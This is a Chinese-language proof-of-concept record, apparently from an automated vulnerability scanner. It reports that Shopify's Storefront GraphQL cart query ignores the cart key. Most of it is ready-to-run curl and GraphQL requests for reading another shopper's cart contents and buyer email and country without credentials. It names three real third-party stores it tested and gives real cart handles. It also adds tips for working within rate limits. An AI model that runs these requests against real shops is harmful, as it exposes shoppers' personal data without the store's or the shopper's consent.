# Shopify Storefront API /api/graphql cart(id) 忽略 ?key 访问分量 → 仅凭 handle 未认证读他人购物车（含 buyerIdentity PII）

- **code**: shopify-storefront-api-cart-id-ignores-key-unauth-read
- **kind**: poc
- **category**: unauthorized
- **component**: Shopify Storefront API（/api/graphql，Cart 对象）
- **severity**: low
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: 三台独立 Shopify 托管店实测，均全程无 Token/Cookie：① gamersdelight.co.uk（task#8）：cartCreate 返回 id 自带 ?key=...（正常访问必须带）；不带 key 仅凭 handle 读 → 200 返回该 cart 内容；带错误 key 仍返回同一 cart；阴性对照随机 handle → cart:null；读 buyerIdentity → {email:null,countryCode:"GB"}。② goffsgames.co.uk（task#11, finding_id=67）：POST /api/graphql（无 Storefront token）基线 cartCreate → id=gid://shopify/Cart/hWNJ1ksJFatnXylgVRNkqHCy?key=d45d4...；不带 key 读 → 200 totalQuantity:1 cost 39.99 GBP buyerIdentity{email:null,countryCode:GB}；带 ?key=wrongkey 仍返回同一 cart（决定性：若校验应为 cart:null）；随机 handle → null；写路径对照 cartLinesAdd 无/错 key → userErrors "The specified cart does not exist."、带正确 key → 成功 totalQuantity 1→2；/api/graphql 与 /api/2026-01/graphql.json、/api/unstable/graphql.json 均复现。③ www.retro32.com（task#12, finding_id=70）：handle gid://shopify/Cart/hWNJ1kmNatQoK6o6iia3SycK，带 ?key=wrongkey 仍 200 返回同一 cart(totalQuantity:1)，随机 handle → null。
- **path**: pocs/shopify-storefront-api-cart-id-ignores-key-unauth-read/poc.md
- **tags**: shopify,storefront-api,graphql,unauthorized,idor,cart,key,info-leak,pii,ecommerce,access-control
- **created_at**: 2026-11-11T14:42:18.442Z
- **engine**: gamersdelight.co.uk; goffsgames.co.uk; www.retro32.com（Shopify 托管店 /api/graphql）
- **found_by**: vuln-scan

## 描述

Shopify 托管店的 Storefront GraphQL 端点 /api/graphql 的 cart(id:) 查询不校验购物车 ID 里的 ?key 访问分量：不带 key、甚至带任意错误 key 都能读到该 cart 的完整内容（行项目、总额、buyerIdentity.email/countryCode 等）。cart 的 key 本是防止他人访问该购物车（shareable checkout / cart permalink）的唯一秘密分量，读路径直接忽略它，导致凭 handle 单分量即可读他人购物车，泄露买家邮箱/国家等 PII。写路径（cartLinesAdd 等）则要求 key —— 说明这是读路径的访问控制不一致。已在 gamersdelight.co.uk / goffsgames.co.uk / www.retro32.com 三店交叉复现。影响有限（需先获得 25 位随机 handle），但一旦 handle 从共享结账链接/Analytics/Referer/日志泄漏即被放大。

## 用法

```
前置：目标为 Shopify 托管店且 Storefront API 匿名可达（POST /api/graphql 返回 {"data":...} 而非 401/403；可用 {shop{name}} 之类查询探活）。无需任何 Token/Cookie。需要目标购物车的 id handle（25 位随机串）。

【步骤 1 自建购物车拿 handle/key 结构（对照基线）】
curl -sk 'https://<shop>/api/graphql' -H 'Content-Type: application/json' \
  -d '{"query":"mutation{ cartCreate(input:{lines:[{merchandiseId:\"gid://shopify/ProductVariant/<VARIANT_ID>\",quantity:1}]}){ cart{ id checkoutUrl } } }"}'
  -> 200 {"data":{"cartCreate":{"cart":{"id":"gid://shopify/Cart/<HANDLE>?key=<KEY>","checkoutUrl":"..."}}}}
  正常业务必须携带 ?key=<KEY> 才能访问该 cart。

【步骤 2 阳性：不带 key，仅凭 handle 读取】
curl -sk 'https://<shop>/api/graphql' -H 'Content-Type: application/json' \
  -d '{"query":"{ cart(id:\"gid://shopify/Cart/<HANDLE>\"){ id totalQuantity cost{totalAmount{amount currencyCode}} } }"}'
  -> 200 {"data":{"cart":{"id":"gid://shopify/Cart/<HANDLE>","totalQuantity":1,"cost":{...}}}}  ← key 未被校验

【步骤 3 决定性证明：带任意错误 key 仍返回同一 cart】
curl -sk 'https://<shop>/api/graphql' -H 'Content-Type: application/json' \
  -d '{"query":"{ cart(id:\"gid://shopify/Cart/<HANDLE>?key=wrongkey\"){ id totalQuantity } }"}'
  -> 200 {"data":{"cart":{"id":"gid://shopify/Cart/<HANDLE>","totalQuantity":1}}}  ← 若 key 被校验，此步应为 cart:null

【步骤 4 读 PII：buyerIdentity】
curl -sk 'https://<shop>/api/graphql' -H 'Content-Type: application/json' \
  -d '{"query":"{ cart(id:\"gid://shopify/Cart/<HANDLE>\"){ id buyerIdentity{email countryCode} createdAt } }"}'
  -> 200 {"data":{"cart":{"id":"...","createdAt":"...","buyerIdentity":{"email":null或邮箱,"countryCode":"GB"}}}}

【步骤 5 写路径对照（界定读/写不一致）】
curl -sk 'https://<shop>/api/graphql' -H 'Content-Type: application/json' \
  -d '{"query":"mutation{ cartLinesAdd(cartId:\"gid://shopify/Cart/<HANDLE>\", lines:[{merchandiseId:\"gid://shopify/ProductVariant/<VARIANT_ID>\",quantity:1}]){ cart{ id totalQuantity } userErrors{field message} } }"}'
  无/错 key -> userErrors:[{"field":["cartId"],"message":"The specified cart does not exist."}]（且新开一辆空 cart）
  带正确 key -> userErrors:[] 且 totalQuantity +1

【阴性对照：不存在的随机 handle】cart(id:"gid://shopify/Cart/AAAAAAAAAAAAAAAAAAAAAAAAA") -> {"data":{"cart":null}}

备用端点：/api/2026-01/graphql.json 与 /api/unstable/graphql.json 同样无 token 可复现。

判据：步骤 2/3 带错误 key 仍返回同一 cart 内容（步骤 3 是与「key 被校验」的唯一决定性区分）；步骤 1 证明正常访问本应带 key。
失败常见原因：目标 Storefront token 未公开/被关（返回 401/403 或 HTML）；ID 里的 handle 必须是 25 位 base62 串，GID 前缀必须 gid://shopify/Cart/；GET 不行必须 POST + Content-Type: application/json；key 在 query string 里作为 id 参数的一部分传入（不是单独参数）；WAF 限速时单线程、请求间隔 ≥3s。
```

## 正文

```
# Shopify Storefront API /api/graphql cart(id) 忽略 ?key 访问分量 → 未认证读他人购物车

## 一句话
Shopify 托管店的 Storefront GraphQL 端点上，`cart(id:)` 查询**不校验**购物车 ID 中的 `?key` 访问分量：不带 key、甚至带任意错误 key 都照常返回该 cart 的完整内容（行项目/总额/`buyerIdentity.email`/`countryCode`）。handle 是 25 位随机串、key 才是访问该购物车的唯一秘密分量，读路径忽略 key 使得仅凭 handle 即可读他人购物车。

## 前提
- 目标为 Shopify 托管店，Storefront API 匿名可达（`POST /api/graphql`）。
- 需要目标购物车的 id handle（25 位随机串）。来源：共享的 checkout 链接 / cart permalink、Analytics、Referer、日志等。
- 无需任何 Token / Cookie。

## 复现（无凭据）
```
# 1) 自建购物车，拿 handle/key 结构（对照基线：正常访问必须带 ?key=<KEY>）
POST /api/graphql
{"query":"mutation{ cartCreate(input:{lines:[{merchandiseId:\"gid://shopify/ProductVariant/<VARIANT_ID>\",quantity:1}]}){ cart{ id checkoutUrl } } }"}
 -> 200 {"data":{"cartCreate":{"cart":{"id":"gid://shopify/Cart/<HANDLE>?key=<KEY>","checkoutUrl":"..."}}}}

# 2) 阳性：不带 key，仅凭 handle 读取
POST /api/graphql
{"query":"{ cart(id:\"gid://shopify/Cart/<HANDLE>\"){ id totalQuantity cost{totalAmount{amount currencyCode}} } }"}
 -> 200 {"data":{"cart":{"id":"gid://shopify/Cart/<HANDLE>","totalQuantity":1,"cost":{"totalAmount":{"amount":"1.5","currencyCode":"GBP"}}}}}

# 3) 决定性证明：带任意错误 key 仍返回同一 cart
POST /api/graphql
{"query":"{ cart(id:\"gid://shopify/Cart/<HANDLE>?key=wrongkey\"){ id totalQuantity } }"}
 -> 200 {"data":{"cart":{"id":"gid://shopify/Cart/<HANDLE>","totalQuantity":1}}}
   ← 若 key 被校验，此步应返回 cart:null

# 4) 读 PII：buyerIdentity
POST /api/graphql
{"query":"{ cart(id:\"gid://shopify/Cart/<HANDLE>\"){ id buyerIdentity{email countryCode} createdAt } }"}
 -> 200 {"data":{"cart":{"id":"...","createdAt":"...","buyerIdentity":{"email":null,"countryCode":"GB"}}}}

# 5) 写路径对照：cartLinesAdd 无 key → userErrors "The specified cart does not exist."；带正确 key → 成功
POST /api/graphql
{"query":"mutation{ cartLinesAdd(cartId:\"gid://shopify/Cart/<HANDLE>\", lines:[{merchandiseId:\"gid://shopify/ProductVariant/<VARIANT_ID>\",quantity:1}]){ cart{ id totalQuantity } userErrors{field message} } }"}

# 阴性对照：不存在的随机 handle
POST /api/graphql
{"query":"{ cart(id:\"gid://shopify/Cart/AAAAAAAAAAAAAAAAAAAAAAAAA\"){ id } }"}
 -> {"data":{"cart":null}}   ← 确系按 id 命中，而非对任何输入兜底
```

## 判定 / 边界
- 判据：**带任意错误 key 仍命中同一 cart**（步骤 3）是与「key 被校验」的唯一决定性区分；步骤 1 证明正常业务访问本应携带 key。
- 与写路径不一致：`cartLinesAdd` / `cartBuyerIdentityUpdate` 等写操作仍要求 key —— 读路径的宽松是访问控制不一致（非完全无鉴权）。
- 影响面：需先获得 handle 才能读；单靠枚举 25 位 base62 handle 不现实，因此定级 low。价值在 handle 泄漏场景（共享结账链接 / Referer / 日志）下放大为他人购物车内容 + 买家邮箱 / 国家 PII 泄露。
- 匿名读下 `buyerIdentity.email` 常被脱敏为 `null`，但 `countryCode`、`createdAt`、行项目/金额可读。
- 失败常见原因：Storefront token 未公开或被关（401/403 或返回 HTML）；handle 非 25 位 base62 串；GID 前缀必须为 `gid://shopify/Cart/`；必须 POST + `Content-Type: application/json`；key 作为 id 参数的一部分（query string）传入，不是独立参数；WAF 触发时单线程、请求间隔 ≥3s。

## 跨靶标复现（同一缺陷，多店交叉验证）
- **gamersdelight.co.uk（task#8）**：handle `hWNJ1j0DYdh5IJEoe8Z07S0m`；不带 / 错误 key 读均返回 `totalQuantity:1`、`cost.totalAmount.amount=1.5 GBP`；`buyerIdentity` 读得 `{"email":null,"countryCode":"GB"}`。
- **goffsgames.co.uk（task#11, finding_id=67）**：`POST /api/graphql`（无 Storefront token）基线 `cartCreate` → id=`gid://shopify/Cart/hWNJ1ksJFatnXylgVRNkqHCy?key=d45d...`；不带 key 读 → 200 `totalQuantity:1`、`cost 39.99 GBP`、`buyerIdentity{email:null,countryCode:GB}`；`?key=wrongkey` 仍返回同一 cart；随机 handle → `null`；写路径 `cartLinesAdd` 无/错 key → `userErrors:[{"field":["cartId"],"message":"The specified cart does not exist."}]`，带正确 key → 成功 `totalQuantity 1→2`。端点 `/api/graphql` 与 `/api/2026-01/graphql.json`、`/api/unstable/graphql.json` 均复现。
- **www.retro32.com（task#12, finding_id=70）**：handle `gid://shopify/Cart/hWNJ1kmNatQoK6o6iia3SycK`；带 `?key=wrongkey` 仍 200 返回同一 cart（`totalQuantity:1`）；随机 handle → `null`。

## 实测样例（脱敏）
- handle：`hWNJ1j0DYdh5IJEoe8Z07S0m`（key `e86ee010...`，读路径均未携带）
- 不带/错误 key 读均返回 `totalQuantity:1`、`cost.totalAmount.amount=1.5 GBP`
- `buyerIdentity` 读得 `{"email":null,"countryCode":"GB"}`

```
